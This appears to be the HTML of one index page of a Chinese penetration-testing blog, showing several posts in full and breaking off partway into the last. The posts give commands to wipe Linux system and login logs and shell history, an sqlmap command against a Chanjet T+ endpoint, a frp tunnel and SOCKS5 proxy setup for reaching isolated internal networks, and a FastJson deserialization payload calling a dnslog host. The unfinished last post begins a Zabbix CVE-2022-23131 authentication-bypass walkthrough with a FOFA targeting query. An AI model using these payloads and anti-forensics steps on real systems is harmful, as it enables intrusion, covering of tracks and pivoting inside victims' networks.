@@ -1,0 +1,1394 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="qwtd-blog">
+<meta property="og:url" content="http://example.com/page/3/index.html">
+<meta property="og:site_name" content="qwtd-blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="气温太低">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/page/3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>qwtd-blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">qwtd-blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">该网站文章仅作为知识分享，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/qiwentaidi/qiwentaidi.github.io" class="github-corner" title="qiwentaidi GitHub" aria-label="qiwentaidi GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4.html" class="post-title-link" itemprop="url">痕迹清除</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-27 15:56:49" itemprop="dateCreated datePublished" datetime="2022-08-27T15:56:49+08:00">2022-08-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-26 11:31:20" itemprop="dateModified" datetime="2022-10-26T11:31:20+08:00">2022-10-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>痕迹清除</p>
+<p>windows</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/mAeIuY1lChFbxoR.png" alt="image-20220804073428642"></p>
+<p>linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /var/log/syslog  // 清除系统日志</span><br><span class="line"></span><br><span class="line">echo &gt; /var/log/wtmp  // 清除用户登录日志</span><br><span class="line"></span><br><span class="line">history -c  // 清除history痕迹</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E5%BA%94%E7%94%A8/%E7%95%85%E6%8D%B7%E9%80%9A.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E5%BA%94%E7%94%A8/%E7%95%85%E6%8D%B7%E9%80%9A.html" class="post-title-link" itemprop="url">畅捷通</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-26 15:56:49" itemprop="dateCreated datePublished" datetime="2022-08-26T15:56:49+08:00">2022-08-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:42:09" itemprop="dateModified" datetime="2023-04-16T10:42:09+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">WEB应用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="畅捷通">1. 畅捷通</h1><h2 id="畅捷通前台SQL注入漏洞">1.1. 畅捷通前台SQL注入漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前台管理员的AccountNum参数存在漏洞</span><br><span class="line">下图处抓包</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/23/JoqrS3HZMEmUA6W.png" alt="image-20220822235322033_1_.png"></p>
+<h2 id="畅捷通未授权访问SQL注入漏洞">1.2. 畅捷通未授权访问SQL注入漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞点为如下目录的zt参数</span><br><span class="line">/tplus/UFAQD/KeyInfoList.aspx?preload=1&amp;zt=1	</span><br><span class="line">sqlmap运行参数如下:</span><br><span class="line">sqlmap -u &quot;target_url&quot; -p zt --level 5  --tamper=space2comment --random-agent</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220822235130899.png" alt="image-20220822235130899"></p>
+<p><img src="https://s2.loli.net/2022/08/22/lp21JfDZECQw6rq.png" alt="image-20220822234600880"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html" class="post-title-link" itemprop="url">Frp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-28 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-28T15:56:49+08:00">2022-07-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:39:28" itemprop="dateModified" datetime="2023-04-16T10:39:28+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Frp内网穿透">0.0.1. Frp内网穿透</h3><h4 id="概念">0.0.1.1. 概念</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用环境">0.0.1.2. 使用环境:</h4><ul>
+<li><input disabled type="checkbox"> 公网服务器1台（必备）,内网服务器1台</li>
+<li><input disabled type="checkbox"> frp工具</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">云上服务器 : x.x.x.x（centos）</span><br><span class="line">目标服务器 : x.x.x.x（windows 10）</span><br><span class="line"></span><br><span class="line">选择对应版本安装frp,对应各平台的amd64版本</span><br><span class="line">https://github.com/fatedier/frp/releases</span><br></pre></td></tr></table></figure>
+
+<h5 id="服务器端配置">0.0.1.2.1. 服务器端配置:</h5><p><code>vi frps.ini</code>修改服务器配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line"># frp监听的端口，默认是7000，可以改成其他的</span><br><span class="line">bind_port = 7000</span><br><span class="line"># 授权码</span><br><span class="line">token = frps  </span><br></pre></td></tr></table></figure>
+
+<p><code>./frps -c frps.ini</code> &#x2F;&#x2F; 启动frp服务端服务</p>
+<p><img src="https://s2.loli.net/2022/07/28/vTkbyrSM5UVpXRh.png" alt="image-20220728181429331"></p>
+<h5 id="客户端配置">0.0.1.2.2. 客户端配置:</h5><p><code>vi frpc.ini</code>修改客户端配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x	#替换成服务器IP</span><br><span class="line">server_port = 7000	#与服务器的监听端口相同</span><br><span class="line"></span><br><span class="line">[ssh] # 可以加可不加</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br><span class="line"></span><br><span class="line">[sock]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7501</span><br><span class="line">user_encryption = true</span><br><span class="line">user_compression = true</span><br><span class="line">plugin = sock5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/15/L7pqDjTwiM32XSu.png" alt="image-20220815122103071"></p>
+<p><code>frpc.exe -c frpc.ini</code> &#x2F;&#x2F; 启动frp客户端服务</p>
+<p><img src="https://s2.loli.net/2022/07/28/I4iLsRKSu6wUPTx.png" alt="image-20220728181458660"></p>
+<h5 id="后台运行（linux）">0.0.1.2.3. 后台运行（linux）:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//服务端</span><br><span class="line">nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">//客户端</span><br><span class="line">nohup ./frpc -c ./frpc.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>停止:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//先找到这个进程</span><br><span class="line">ps -aux|grep frp| grep -v grep</span><br><span class="line">root      3600  0.1  0.1 110188  9484 pts/0    Sl   15:04   0:00 ./frpc -c ./frpc.ini</span><br><span class="line">//杀死进程</span><br><span class="line">kill -9 3600</span><br></pre></td></tr></table></figure>
+
+<h4 id="ssh远程连接">0.0.1.3. ssh远程连接:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 用户名@云服务器IP -p 6000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/28/tq2anC8Y3ANBvbH.png" alt="image-20220728181712375"></p>
+<p><img src="https://s2.loli.net/2022/07/28/N2vj3qSAcEfr6QH.png" alt="image-20220728181730339"></p>
+<h4 id="sock5突破隔离内网：">0.0.1.4. sock5突破隔离内网：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用proxifier软件进行sock5代理</span><br><span class="line">1、代理服务器地址设置成VPS地址</span><br><span class="line">2、代理规则动作设置成代理服务器，目标主机设置成自己想访问的内网网段</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/15/SGFc5BmDU8tLxk6.png" alt="image-20220815204933978"></p>
+<p><img src="https://s2.loli.net/2022/08/15/UgRt2LpVfi1Dq4w.png" alt="image-20220815205243791"></p>
+<p>3、实现访问强隔离内网</p>
+<p><img src="https://s2.loli.net/2022/08/15/B5dMSZ3vuakHIt1.png" alt="image-20220815145615545"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E6%A1%86%E6%9E%B6/Fastjson.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E6%A1%86%E6%9E%B6/Fastjson.html" class="post-title-link" itemprop="url">FastJson</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-24 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-24T15:56:49+08:00">2022-07-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:39:17" itemprop="dateModified" datetime="2023-04-16T10:39:17+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E6%A1%86%E6%9E%B6/" itemprop="url" rel="index"><span itemprop="name">WEB框架</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="FastJson反序列化漏洞">1. FastJson反序列化漏洞</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastjson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包，fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用：">1.2. 漏洞利用：</h2><p>可以通过burp插件FastJsonScan实现被动扫描检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;x&quot;:			&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;wq122qedk25rwzt.fwxxn1.dnslog.cn&quot;,&quot;portToConnectTo&quot;:80,&quot;info&quot;:&#123;&quot;user&quot;:&quot;root&quot;,&quot;password&quot;:&quot;ubuntu&quot;,&quot;useSSL&quot;:&quot;false&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;&#125;,&quot;databaseToConnectTo&quot;:&quot;mysql&quot;,&quot;url&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416091752822.png" alt="image-20230416091752822"></p>
+<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、将fastjson升级至最新版本。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E5%BA%94%E7%94%A8/Zabbix.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E5%BA%94%E7%94%A8/Zabbix.html" class="post-title-link" itemprop="url">Zabbix</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-24 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-24T15:56:49+08:00">2022-07-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:42:33" itemprop="dateModified" datetime="2023-04-16T10:42:33+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">WEB应用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="zabbix认证绕过漏洞（CVE-2022-23131）">1. zabbix认证绕过漏洞（CVE-2022-23131）</h1><h2 id="风险描述">1.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zabbix是拉脱维亚Zabbix SIA公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 未经身份验证的恶意攻击者可能会利用此问题来提升权限并获得对 Zabbix 前端的管理员访问权限。</span><br></pre></td></tr></table></figure>
+
+<p><code>fofa:app=&quot;ZABBIX-监控系统&quot; &amp;&amp; body=&quot;saml&quot;</code></p>
+<p><img src="https://s2.loli.net/2022/07/25/RyFqEgfjbirVC4I.png" alt="image-20220725005801979"></p>
+<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4.0.36</span><br><span class="line"></span><br><span class="line">5.4.0</span><br><span class="line"></span><br><span class="line">5.4.8</span><br><span class="line"></span><br><span class="line">6.0.0alpha1</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现：">1.3. 漏洞复现：</h2><p><img src="https://s2.loli.net/2022/07/25/ad2ioMbjwvIV7Y8.png" alt="image-20220725005445702"></p>
+<p>通过请求原始页面，获取zbx_session字段的值为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzZXNzaW9uaWQiOiJlM2NlNDY4ZjE3NjMyZjBkNTgxZjdjZDEyNmJlNGM1YSIsInNpZ24iOiI4M2FkMTc1YjE1ZGNkNTJkMDI1NDljYjRiYzRkN2FmMGFjYTY5ZTIzNWYyODg3NjY5ZjdiMjA4OTRiN2RiNGFjIn0%3D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/25/bDujAFrL7sd5lgE.png" alt="image-20220725020207605"></p>
+<p>先进行URL解码（%3D为&#x3D;）再将值进行base64解码</p>
+<p><img src="https://s2.loli.net/2022/07/25/MlZWt9Cjeun17Vs.png" alt="image-20220725011909395"></p>
+<p>解码成功后构造payload，将解码后的参数值替换下方参数值</p>
